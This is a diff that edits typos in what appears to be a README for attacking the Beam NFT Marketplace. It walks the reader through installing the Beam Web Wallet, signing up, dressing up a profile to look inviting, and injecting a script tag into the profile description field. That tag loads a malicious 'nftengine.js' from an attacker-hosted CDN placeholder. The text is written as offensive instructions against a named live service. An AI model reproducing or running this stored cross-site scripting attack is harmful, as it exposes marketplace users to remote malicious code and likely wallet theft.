@@ -14,7 +14,7 @@
 
 ## How to execute
 
-Before injecting the malicious payload, you must first download and install the [Beam Web Wallet](https://chrome.google.com/webstore/detail/beam-web-wallet/ilhaljfiglknggcoegeknjghdgampffk), after this head over to the [The Beam NFT Marketplace](https://beamnft.art/) and and get signed up!
+Before injecting the malicious payload, you must first download and install the [Beam Web Wallet](https://chrome.google.com/webstore/detail/beam-web-wallet/ilhaljfiglknggcoegeknjghdgampffk), after this head over to [The Beam NFT Marketplace](https://beamnft.art/) and get signed up!
 
 Once signed up, complete your profile, an attacker would want to make this look as presentable and inviting as possible. The description field is where were going to inject our malicious javascript!
 
@@ -23,7 +23,7 @@ Once signed up, complete your profile, an attacker would want to make this look 
 Within the description field, simply enter the following piece of javascript
 
 ```
-<script src="https://<yourcdn>.net/nftengine.js"></script>;
+<script src="https://<yourcdn>.net/nftengine.js"></script>
 ```
 
 Typically a threat actor may use a CDN to to host the malicious payload, the above code will not work, the payload will load from an external source (source your own cdn and use correct url)
